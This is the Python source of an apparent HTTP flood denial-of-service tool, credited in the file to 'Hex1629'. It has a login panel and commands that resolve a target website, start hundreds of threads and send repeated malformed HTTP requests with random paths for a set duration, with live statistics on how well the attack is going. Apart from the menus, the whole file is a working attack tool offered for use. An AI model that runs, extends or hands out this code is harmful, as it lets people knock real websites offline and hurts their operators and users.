# CHECK IMPORT
try:
    import socket
    import threading
    import string
    import random
    import time
    import os
    import platform
    import sys
    import requests
    from colorama import Fore
except ModuleNotFoundError as e:
    print(f"{e} CAN'T IMPORT . . . . ")
    exit()

GUI_SETUP = 0

# DEF & CLASS

username = ''
password = ''

def login_checker(username,password):
    file_path = os.path.join(os.path.dirname(__file__), 'login.txt')
    try:
        with open(file_path) as f:
            credentials = [x.strip() for x in f.readlines() if x.strip()]
            for x in credentials:
             c_username, c_password = x.split('@')
             if c_username.upper()  == username.upper() and c_password.upper() == password.upper():
               return True
    except FileNotFoundError:
        return 'UNKNOWN ERROR ARE RETURNING BY FILESNOTFOUND'

def clear_text():
    if platform.system().upper() == "WINDOWS":
        os.system('cls')
    else:
        os.system('clear')

def generate_url_path_pyflooder(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, int(num)))
    return data
    
def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

# DOS
def DoS_Attack(ip,host,port,type_attack,booter_sent,data_type_loader_packet):
    url_path = ''
    path_get = ['PY_FLOOD','CHOICES_FLOOD']
    path_get_loader = random.choice((path_get))
    if path_get_loader == "PY_FLOOD":
        url_path = generate_url_path_pyflooder(5)
    else:
        url_path = generate_url_path_choice(5)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(3)  # Set timeout lebih pendek untuk menghindari hanging
    try:
        # Attempt connection
        s.connect((ip,port))
        if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n".encode()
        elif data_type_loader_packet == 'OWN1':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
        elif data_type_loader_packet == 'OWN2':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n".encode()
        elif data_type_loader_packet == 'OWN3':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n".encode()
        elif data_type_loader_packet == 'OWN4':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n".encode()
        elif data_type_loader_packet == 'OWN5':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r".encode()
        elif data_type_loader_packet == 'OWN6':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r\n".encode()
        elif data_type_loader_packet == 'OWN7':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r".encode()
        elif data_type_loader_packet == 'OWN8':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r".encode()
        elif data_type_loader_packet == 'TEST':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r\n\n".encode()
        elif data_type_loader_packet == 'TEST2':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\n\r\r\n\r\n\n\n".encode()
        elif data_type_loader_packet == 'TEST3':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\r\n\n".encode()
        elif data_type_loader_packet == 'TEST4':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\a\n\n\r\r".encode()
        elif data_type_loader_packet == 'TEST5':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\t\n\n\r\r".encode()
        s.connect((ip,port))
        for _ in range(booter_sent):
            s.sendall(packet_data)
            s.send(packet_data)
        s.close()
        return 'success'
    except socket.timeout:
        try:
            s.close()
        except:
            pass
        return 'timeout'
    except socket.error as e:
        # Connection error - silent fail untuk performance
        try:
            s.close()
        except:
            pass
        return 'socket_error'
    except Exception as e:
        # Other errors - silent fail
        try:
            s.close()
        except:
            pass
        return 'error'

status_code = False
active_threads = 0
max_concurrent_threads = 500  # Batas maksimal thread concurrent (dikurangi untuk stabilitas)
thread_lock = threading.Lock()
attack_stats = {
    'total_attempts': 0,
    'successful_connections': 0,
    'failed_connections': 0,
    'timeout_errors': 0,
    'socket_errors': 0
}
stats_lock = threading.Lock()

def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet):
    global status_code, active_threads, attack_stats
    thread_id = threading.current_thread().ident
    backoff_delay = 0.01  # Initial backoff delay
    max_backoff = 0.5  # Maximum backoff delay
    
    # Langsung jalankan attack tanpa cek status_code
    while time.time() < time_loader:
        # Langsung jalankan attack di thread ini juga, tidak hanya membuat thread baru
        # Ini memastikan ada attack yang berjalan
        try:
            result = DoS_Attack(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet)
            with stats_lock:
                attack_stats['total_attempts'] += 1
                if result == 'success':
                    attack_stats['successful_connections'] += 1
                elif result == 'timeout':
                    attack_stats['timeout_errors'] += 1
                elif result == 'socket_error':
                    attack_stats['socket_errors'] += 1
                else:
                    attack_stats['failed_connections'] += 1
        except Exception as e:
            with stats_lock:
                attack_stats['total_attempts'] += 1
                attack_stats['failed_connections'] += 1
        
        # Buat thread tambahan untuk meningkatkan throughput
        for _ in range(spam_loader):
            # Cek jumlah thread aktif sebelum membuat thread baru
            with thread_lock:
                if active_threads >= max_concurrent_threads:
                    # Exponential backoff jika thread limit tercapai
                    time.sleep(backoff_delay)
                    backoff_delay = min(backoff_delay * 1.5, max_backoff)
                    continue
                active_threads += 1
                backoff_delay = 0.01  # Reset backoff jika berhasil
            
            def attack_with_counter():
                global active_threads, attack_stats
                result = None
                try:
                    # Langsung jalankan attack
                    result = DoS_Attack(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet)
                except Exception as e:
                    result = 'error'
                finally:
                    # Update stats - PASTIKAN selalu diupdate
                    with stats_lock:
                        attack_stats['total_attempts'] += 1
                        if result == 'success':
                            attack_stats['successful_connections'] += 1
                        elif result == 'timeout':
                            attack_stats['timeout_errors'] += 1
                        elif result == 'socket_error':
                            attack_stats['socket_errors'] += 1
                        else:
                            attack_stats['failed_connections'] += 1
                    # Decrease active thread count
                    with thread_lock:
                        active_threads -= 1
            
            try:
                th = threading.Thread(target=attack_with_counter)
                th.daemon = True
                th.start()
            except RuntimeError as e:
                # Jika tidak bisa membuat thread, tunggu sebentar
                with thread_lock:
                    active_threads -= 1
                with stats_lock:
                    attack_stats['failed_connections'] += 1
                time.sleep(0.1)
                continue
prefix_get = "!"
status_help_type = 0
def command():
    global status_help_type,status_code,prefix_get,username,password,GUI_SETUP
    if status_help_type == 0:
        print(f"{Fore.LIGHTYELLOW_EX}         __..---..__\n{Fore.YELLOW}     ,-='  {Fore.RED}/  |  \{Fore.YELLOW}  `=-.\n{Fore.LIGHTWHITE_EX}    :--..___________..--;\n{Fore.WHITE}     \.,_____________,./ \n{Fore.RED}   ╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗┌─┐┬┌─┐\n{Fore.LIGHTRED_EX}   ╚═╗║ ║║  ╠╩╗║╣  ║ ├─┘│├┤ \n{Fore.WHITE}   ╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩o┴  ┴└─┘\n {Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Fore.WHITE}< {Fore.LIGHTGREEN_EX}TYPE {prefix_get}HELP FOR SHOW COMMAND {Fore.WHITE}> {Fore.RESET}")
        status_help_type += 1
    else:
        pass

    data_input_loader = input(f"{Fore.CYAN}{username}{Fore.WHITE}@{Fore.BLUE}{password} {Fore.WHITE}${Fore.RESET}")
    args_get = data_input_loader.split(" ")
    if args_get[0].upper() == f"{prefix_get}CREDIT":
        print(f"{Fore.YELLOW}         __..---..__\n{Fore.YELLOW}     ,-='  {Fore.RED}/  |  \{Fore.YELLOW}  `=-.\n{Fore.LIGHTWHITE_EX}    :--..___________..--;\n{Fore.WHITE}     \.,_____________,./ \n{Fore.LIGHTYELLOW_EX}   ╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗{Fore.RED}┌─┐┬┌─┐\n{Fore.YELLOW}   ╚═╗║ ║║  ╠╩╗║╣  ║{Fore.LIGHTRED_EX} ├─┘│├┤ \n{Fore.LIGHTRED_EX}   ╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩{Fore.WHITE}o{Fore.LIGHTYELLOW_EX}┴  ┴└─┘\n\n{Fore.LIGHTMAGENTA_EX}CREDIT {Fore.WHITE}- {Fore.LIGHTBLUE_EX}ART {Fore.WHITE}: {Fore.CYAN}Riitta Rasimus {Fore.WHITE}- {Fore.LIGHTCYAN_EX}ascii.co.uk/art/pie {Fore.WHITE}|{Fore.GREEN} DEV {Fore.WHITE}- {Fore.LIGHTGREEN_EX}github.com/Hex1629{Fore.RESET}")
    elif args_get[0].upper() == f"{prefix_get}HELP":
        print(f"{Fore.GREEN}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━┓\n┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━┫\n{Fore.LIGHTGREEN_EX}┃ HELP COMMAND . menu                                ┃\n{Fore.GREEN}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\n   {Fore.RED}{prefix_get}HELP         {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For show command\n   {Fore.RED}{prefix_get}CREDIT       {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For show credit\n   {Fore.RED}{prefix_get}CLS          {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For clear all screen\n   {Fore.RED}{prefix_get}MENU         {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For return to menu\n   {Fore.RED}{prefix_get}GUI_SET      {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For change gui attack\n   {Fore.RED}{prefix_get}PREFIX_SET   {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For set prefix\n   {Fore.RED}{prefix_get}FLOOD        {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For attack target with http flood\n   {Fore.RED}{prefix_get}PING_URL     {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For ping test with url\n   {Fore.RED}{prefix_get}PING_TCP     {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For ping test with tcp\n   {Fore.RED}{prefix_get}EXIT         {Fore.LIGHTGREEN_EX}┃ {Fore.YELLOW}For exit from panel\n{Fore.GREEN}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{Fore.RESET}")
    elif args_get[0].upper() == f"{prefix_get}PREFIX_SET":
        if len(args_get) == 2:
            prefix_get = args_get[1]
            clear_text()
            print(f"{Fore.LIGHTYELLOW_EX}         __..---..__\n{Fore.YELLOW}     ,-='  {Fore.RED}/  |  \{Fore.YELLOW}  `=-.\n{Fore.LIGHTWHITE_EX}    :--..___________..--;\n{Fore.WHITE}     \.,_____________,./ \n{Fore.RED}   ╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗┌─┐┬┌─┐\n{Fore.LIGHTRED_EX}   ╚═╗║ ║║  ╠╩╗║╣  ║ ├─┘│├┤ \n{Fore.WHITE}   ╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩o┴  ┴└─┘\n {Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Fore.WHITE}< {Fore.LIGHTGREEN_EX}TYPE {prefix_get}HELP FOR SHOW COMMAND {Fore.WHITE}> {Fore.RESET}")
        else:
            print(f"{Fore.YELLOW}{prefix_get}PREFIX_SET <PREFIX>{Fore.RESET}")
    elif args_get[0].upper() == f"{prefix_get}GUI_SET":
        if len(args_get) == 2:
            gui_leak = args_get[1].upper()
            if gui_leak == "OLD":
                GUI_SETUP = 0
            elif gui_leak == "TEXT":
                GUI_SETUP = 1
            elif gui_leak == "TEXT2":
                GUI_SETUP = 2
            elif gui_leak == "TEXT3":
                GUI_SETUP = 3
        else:
            print(f"{Fore.RED}{prefix_get}GUI_SET {Fore.LIGHTRED_EX}<MODE>{Fore.RESET}")
            print(f"{Fore.GREEN}MODE ---> OLD TEXT TEXT2 TEXT3{Fore.RESET}")
    elif args_get[0].upper() == f"{prefix_get}CLEAR" or args_get[0].upper() == f"{prefix_get}CLS":
        clear_text()
    elif args_get[0].upper() == f"{prefix_get}MENU":
        clear_text()
        print(f"{Fore.LIGHTYELLOW_EX}         __..---..__\n{Fore.YELLOW}     ,-='  {Fore.RED}/  |  \{Fore.YELLOW}  `=-.\n{Fore.LIGHTWHITE_EX}    :--..___________..--;\n{Fore.WHITE}     \.,_____________,./ \n{Fore.RED}   ╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗┌─┐┬┌─┐\n{Fore.LIGHTRED_EX}   ╚═╗║ ║║  ╠╩╗║╣  ║ ├─┘│├┤ \n{Fore.WHITE}   ╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩o┴  ┴└─┘\n {Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] {Fore.WHITE}< {Fore.LIGHTGREEN_EX}TYPE {prefix_get}HELP FOR SHOW COMMAND {Fore.WHITE}> {Fore.RESET}")
    elif args_get[0].upper() == f"{prefix_get}EXIT":
        print(f"{Fore.LIGHTGREEN_EX}EXIT . . .{Fore.RESET}")
        try:
            exit()
        except:
            sys.exit()
    elif args_get[0].upper() == f"{prefix_get}PING_URL":
        if len(args_get) == 2:
            status_code_leak = ''
            try:
                a = time.time()
                url = args_get[1]
                req = requests.get(url)
                b = time.time()
                status_code_leak = "OK"
            except:
                c = time.time()
                status_code_leak = 'NO'
            if status_code_leak == "OK":
                print(f"{Fore.BLUE}STATUS_CODE{Fore.WHITE}={Fore.LIGHTBLUE_EX}{req.status_code}:{req.reason} {Fore.CYAN}REQUESTS{Fore.WHITE}={Fore.LIGHTCYAN_EX}{a} MS {Fore.YELLOW}RESPONSE{Fore.WHITE}={Fore.LIGHTYELLOW_EX}{b} MS {Fore.RED}PING{Fore.WHITE}={Fore.LIGHTRED_EX}{a-b} MS{Fore.RESET}")
            else:
                print(f"{Fore.BLUE}STATUS_CODE{Fore.WHITE}={Fore.LIGHTBLUE_EX}CAN'T CONNECT {Fore.CYAN}REQUESTS{Fore.WHITE}={Fore.LIGHTCYAN_EX}{a} MS {Fore.YELLOW}RESPONSE{Fore.WHITE}={Fore.LIGHTYELLOW_EX}NULL MS {Fore.RED}PING{Fore.WHITE}={Fore.LIGHTRED_EX}NULL MS{Fore.RESET}")
        else:
            print(f"{Fore.LIGHTRED_EX}{prefix_get}PING_URL {Fore.RED}<URL>{Fore.RESET}")
            print(f"{Fore.LIGHTRED_EX}HEY IF YOU DDOS/DOS TO TARGET IF STRAIGHT WEBSITE\n{Fore.YELLOW}ITS MAKE PINGER STOP IF STOP YOU CAN CLOSE PYTHON ONLY AND NEXT OPEN AGAIN (OK)\n{Fore.RED}NOT BUG YOU KNOW? | [BECAUSE I CAN'T FIX]{Fore.RESET}")
    elif args_get[0].upper() == f"{prefix_get}PING_TCP":
        if len(args_get) == 3:
            status_code_leak = ''
            ip_tar = str(args_get[1])
            port_tar = int(args_get[2])
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            try:
                a = time.time()
                s.connect((ip_tar,port_tar))
                b = time.time()
                status_code_leak = "OK"
            except:
                c = time.time()
                status_code_leak = 'NO'
            s.close()
            if status_code_leak == "OK":
                print(f"{Fore.BLUE}STATUS_CODE{Fore.WHITE}={Fore.LIGHTBLUE_EX}CONNECT {Fore.CYAN}REQUESTS{Fore.WHITE}={Fore.LIGHTCYAN_EX}{a} MS {Fore.YELLOW}RESPONSE{Fore.WHITE}={Fore.LIGHTYELLOW_EX}{b} MS {Fore.RED}PING{Fore.WHITE}={Fore.LIGHTRED_EX}{a-b} MS{Fore.RESET}")
            else:
                print(f"{Fore.BLUE}STATUS_CODE{Fore.WHITE}={Fore.LIGHTBLUE_EX}CAN'T CONNECT {Fore.CYAN}REQUESTS{Fore.WHITE}={Fore.LIGHTCYAN_EX}{a} MS {Fore.YELLOW}RESPONSE{Fore.WHITE}={Fore.LIGHTYELLOW_EX}NULL MS {Fore.RED}PING{Fore.WHITE}={Fore.LIGHTRED_EX}NULL MS{Fore.RESET}")
        else:
            print(f"{Fore.LIGHTRED_EX}{prefix_get}PING_TCP {Fore.RED}<IP> <PORT>{Fore.RESET}")
    elif args_get[0].upper() == f"{prefix_get}FLOOD":
        if len(args_get) == 10:
            data_type_loader_packet = args_get[1].upper()
            target_loader = args_get[2]
            port_loader = int(args_get[3])
            time_loader = time.time() + int(args_get[4])
            spam_loader = int(args_get[5])
            create_thread = int(args_get[6])
            booter_sent = int(args_get[7])
            methods_loader = args_get[8]
            spam_create_thread = int(args_get[9])
            code_leak = True
            host = ''
            ip = ''
            try:
                print(f"{Fore.CYAN}[LOG] {Fore.WHITE}Parsing target URL: {Fore.YELLOW}{target_loader}{Fore.RESET}")
                is_https = "https://" in target_loader.lower()
                
                # Parse URL dengan benar - ambil hanya hostname, bukan path
                url_clean = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "")
                # Split berdasarkan "/" dan ambil bagian pertama (hostname)
                host = url_clean.split("/")[0].split("?")[0]  # Ambil hostname, hapus query string juga
                
                print(f"{Fore.CYAN}[LOG] {Fore.WHITE}Extracted hostname: {Fore.YELLOW}{host}{Fore.RESET}")
                
                # Port warning
                if is_https and port_loader == 80:
                    print(f"{Fore.YELLOW}[WARNING] {Fore.WHITE}HTTPS URL detected but using port 80. Consider using port 443 for HTTPS.{Fore.RESET}")
                elif not is_https and port_loader == 443:
                    print(f"{Fore.YELLOW}[WARNING] {Fore.WHITE}HTTP URL detected but using port 443. Consider using port 80 for HTTP.{Fore.RESET}")
                
                if '.gov' in host or '.mil' in host or '.edu' in host or '.ac' in host:
                    code_leak = False
                    print(f"{Fore.RED}[ERROR] {Fore.WHITE}Blocked domain type: {Fore.YELLOW}.gov .mil .edu .ac{Fore.RESET}")
                else:
                    print(f"{Fore.CYAN}[LOG] {Fore.WHITE}Resolving DNS for {Fore.YELLOW}{host}{Fore.WHITE}...{Fore.RESET}")
                    ip = socket.gethostbyname(host)
                    print(f"{Fore.GREEN}[LOG] {Fore.WHITE}DNS resolved: {Fore.CYAN}{host}{Fore.WHITE} -> {Fore.CYAN}{ip}{Fore.RESET}")
                    code_leak = True
            except socket.gaierror as e:
                code_leak = False
                print(f"{Fore.RED}[ERROR] {Fore.WHITE}DNS resolution failed: {Fore.YELLOW}{str(e)}{Fore.RESET}")
                print(f"{Fore.RED}[ERROR] {Fore.WHITE}Please check if the hostname is correct and reachable{Fore.RESET}")
            except Exception as e:
                code_leak = False
                print(f"{Fore.RED}[ERROR] {Fore.WHITE}Unexpected error during DNS resolution: {Fore.YELLOW}{str(e)}{Fore.RESET}")
            if code_leak == True:
             # Reset stats
             with stats_lock:
                 attack_stats['total_attempts'] = 0
                 attack_stats['successful_connections'] = 0
                 attack_stats['failed_connections'] = 0
                 attack_stats['timeout_errors'] = 0
                 attack_stats['socket_errors'] = 0
             
             status_code = True  # Set status_code SEBELUM membuat thread
             print(f"{Fore.GREEN}[+] {Fore.WHITE}Target IP: {Fore.CYAN}{ip}{Fore.RESET}")
             print(f"{Fore.GREEN}[+] {Fore.WHITE}Target Host: {Fore.CYAN}{host}{Fore.RESET}")
             print(f"{Fore.GREEN}[+] {Fore.WHITE}Port: {Fore.CYAN}{port_loader}{Fore.RESET}")
             print(f"{Fore.GREEN}[+] {Fore.WHITE}Duration: {Fore.CYAN}{int(args_get[4])}{Fore.WHITE} seconds{Fore.RESET}")
             total_threads = create_thread * spam_create_thread
             print(f"{Fore.GREEN}[+] {Fore.WHITE}Creating {Fore.YELLOW}{total_threads}{Fore.WHITE} worker threads...{Fore.RESET}")
             thread_count = 0
             start_time = time.time()
             for loader_num in range(create_thread):
                sys.stdout.write(f"\r {Fore.YELLOW}{loader_num + 1} OF {create_thread} CREATE THREAD . . .{Fore.RESET}")
                sys.stdout.flush()
                for _ in range(spam_create_thread):
                  try:
                    th = threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet))
                    th.daemon = True
                    th.start()
                    thread_count += 1
                    # Tambahkan delay kecil untuk menghindari thread explosion
                    if thread_count % 50 == 0:
                        time.sleep(0.01)
                  except RuntimeError as e:
                    print(f"\n{Fore.RED}[!] {Fore.WHITE}Warning: Cannot create more threads ({str(e)}). Continuing with existing threads...{Fore.RESET}")
                    break
                if thread_count >= total_threads:
                    break
             sys.stdout.write(f"\r {Fore.GREEN}Successfully created {thread_count} worker threads!{Fore.RESET}\n")
             sys.stdout.flush()
             
             # Start stats monitoring thread
             def print_stats():
                 last_attempts = 0
                 last_success = 0
                 while time.time() < time_loader:
                     time.sleep(2)  # Update setiap 2 detik
                     with stats_lock:
                         stats = attack_stats.copy()
                     with thread_lock:
                         active = active_threads
                     elapsed = time.time() - start_time
                     
                     # Calculate rate
                     attempts_rate = stats['total_attempts'] - last_attempts
                     success_rate = stats['successful_connections'] - last_success
                     last_attempts = stats['total_attempts']
                     last_success = stats['successful_connections']
                     
                     # Calculate success percentage
                     success_pct = (stats['successful_connections'] / stats['total_attempts'] * 100) if stats['total_attempts'] > 0 else 0
                     
                     print(f"{Fore.CYAN}[STATS] {Fore.WHITE}Time: {Fore.YELLOW}{int(elapsed)}s{Fore.WHITE} | "
                           f"Threads: {Fore.YELLOW}{active}/{max_concurrent_threads}{Fore.WHITE} | "
                           f"Attempts: {Fore.GREEN}{stats['total_attempts']}{Fore.WHITE} ({Fore.GREEN}+{attempts_rate}/2s{Fore.WHITE}) | "
                           f"Success: {Fore.GREEN}{stats['successful_connections']}{Fore.WHITE} ({Fore.GREEN}+{success_rate}/2s{Fore.WHITE}, {Fore.CYAN}{success_pct:.1f}%{Fore.WHITE}) | "
                           f"Timeout: {Fore.YELLOW}{stats['timeout_errors']}{Fore.WHITE} | "
                           f"Socket Err: {Fore.RED}{stats['socket_errors']}{Fore.WHITE} | "
                           f"Failed: {Fore.RED}{stats['failed_connections']}{Fore.RESET}")
             
             stats_thread = threading.Thread(target=print_stats)
             stats_thread.daemon = True
             stats_thread.start()
             if GUI_SETUP == 0:
                clear_text()
                print(f"{Fore.LIGHTCYAN_EX}Sending Packet {Fore.CYAN}HTTP FLOOD {Fore.LIGHTCYAN_EX}To Target {Fore.WHITE}!\n\n{Fore.YELLOW}    ━╦━━━━━━━━━━━━━━━━━━━━━╦━\n{Fore.LIGHTYELLOW_EX}╚═══╦╩═════════════════════╩╦═══╝\n{Fore.WHITE}       ━ ━ ━ {Fore.LIGHTGREEN_EX}SENDING {Fore.WHITE}━ ━ ━  \n{Fore.LIGHTRED_EX}  ╔═╩═══════════════════════╩═╗\n     {Fore.GREEN}Target: {target_loader}\n       {Fore.GREEN}Port: {port_loader}\n       {Fore.GREEN}Type: {data_type_loader_packet}\n{Fore.RED}  ╚═══════════════════════════╝\n      {Fore.BLUE}@DEV {Fore.WHITE}- {Fore.LIGHTBLUE_EX}Hex1629{Fore.RESET}")
             elif GUI_SETUP == 3:
                clear_text()
                print(f"{Fore.YELLOW}   ╔━━━━━━━━━━━━━━━━━━━━━╗\n        {Fore.BLUE}DEV {Fore.WHITE}━ {Fore.CYAN}HEX1629    \n{Fore.LIGHTYELLOW_EX}   ╚━╦━━━━━━━━━━━━━━━━━╦━╝\n{Fore.LIGHTRED_EX}╦━━━━╩━━━━━━━━━━━━━━━━━╩━━━━╦\n {Fore.LIGHTGREEN_EX} TARGET {Fore.WHITE}━ {Fore.GREEN}{target_loader}\n   {Fore.LIGHTGREEN_EX} PORT {Fore.WHITE}─ {Fore.GREEN}{port_loader}\n    {Fore.LIGHTGREEN_EX}TIME {Fore.WHITE}━ {Fore.GREEN}{time_loader}\n{Fore.RED}╩━━━━━━━━━━━━━━━━━━━━━━━━━━━╩{Fore.RESET}")
             elif GUI_SETUP == 1:
                 print(f"\n{Fore.MAGENTA}[{Fore.WHITE}SOCKET.PIE{Fore.MAGENTA}]{Fore.WHITE} Send {Fore.WHITE}<{Fore.GREEN}{data_type_loader_packet}{Fore.WHITE}> {Fore.WHITE}to {Fore.RED}{ip}:{port_loader}")
             elif GUI_SETUP == 2:
                 print(f"\n{Fore.MAGENTA}[{Fore.WHITE}!{Fore.MAGENTA}]{Fore.WHITE} Send attack to {Fore.RED}{ip}:{port_loader} {Fore.MAGENTA}[{Fore.WHITE}!{Fore.MAGENTA}]{Fore.RESET}")
        else:
            print(f"{Fore.RED}{prefix_get}FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
            print(f"{Fore.CYAN}TYPE_PACKET --> {Fore.WHITE}[ {Fore.LIGHTBLUE_EX}PYF {Fore.WHITE}| TEST TEST2 TEST3 TEST4 TEST5 {Fore.WHITE}| {Fore.BLUE}OWN1 OWN2 OWN3 OWN4 OWN5 OWN6 OWN7 {Fore.WHITE}]\n {Fore.WHITE}[+] {Fore.LIGHTCYAN_EX}TIME (EXAMPLE=250)\n {Fore.WHITE}[+] {Fore.GREEN}SPAM_THREAD (EXAMPLE=299)\n {Fore.WHITE}[+] {Fore.LIGHTGREEN_EX}CREATE_THREAD (EXAMPLE=5)\n {Fore.WHITE}[+] {Fore.LIGHTYELLOW_EX}HTTP_METHODS (EXAMPLE=GATEWAY)\n {Fore.WHITE}[+] {Fore.YELLOW}SPAM_CREATE (EXAMPLE=15){Fore.RESET}")
    else:
        print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
    command()
def checker_login():
    global username,password
    clear_text()
    print(f"{Fore.LIGHTYELLOW_EX}         __..---..__\n{Fore.YELLOW}     ,-='  {Fore.RED}/  |  \{Fore.YELLOW}  `=-.\n{Fore.LIGHTWHITE_EX}    :--..___________..--;\n{Fore.WHITE}     \.,_____________,./ \n{Fore.RED}   ╔═╗╔═╗╔═╗╦╔═╔═╗╔╦╗┌─┐┬┌─┐\n{Fore.LIGHTRED_EX}   ╚═╗║ ║║  ╠╩╗║╣  ║ ├─┘│├┤ \n{Fore.WHITE}   ╚═╝╚═╝╚═╝╩ ╩╚═╝ ╩o┴  ┴└─┘{Fore.RESET}")
    print(f"{Fore.YELLOW}USER - ROOT {Fore.LIGHTYELLOW_EX}PASSWORD - ROOT{Fore.RESET}")
    time.sleep(0.5)
    username = input(f"{Fore.CYAN}USERNAME {Fore.WHITE}${Fore.RESET}")
    time.sleep(0.5)
    password = input(f"{Fore.BLUE}PASSWORD {Fore.WHITE}${Fore.RESET}")
    time.sleep(0.5)
    print(F"{Fore.BLUE}LOGIN TO PANEL {Fore.WHITE}({Fore.LIGHTBLUE_EX}TRYING LOGIN WITH {username}@{password}{Fore.WHITE}) . . .{Fore.RESET}")
    time.sleep(int(random.randint(1,3)))
    if login_checker(username,password) == True:
     print(f"{Fore.CYAN}PANEL LOADING . . .{Fore.RESET}")
     time.sleep(1)
     clear_text()
     command()
    elif login_checker(username,password) == 'UNKNOWN ERROR ARE RETURNING BY FILESNOTFOUND':
        print(f"{Fore.RED}UNKNOWN ERROR OF FILES 'login.txt'{Fore.RESET}")
        time.sleep(1)
        checker_login()
    else:
     print(f"{Fore.RED}FAILED {Fore.YELLOW}LOGIN . . .{Fore.RESET}")
     time.sleep(1)
     checker_login()
checker_login()
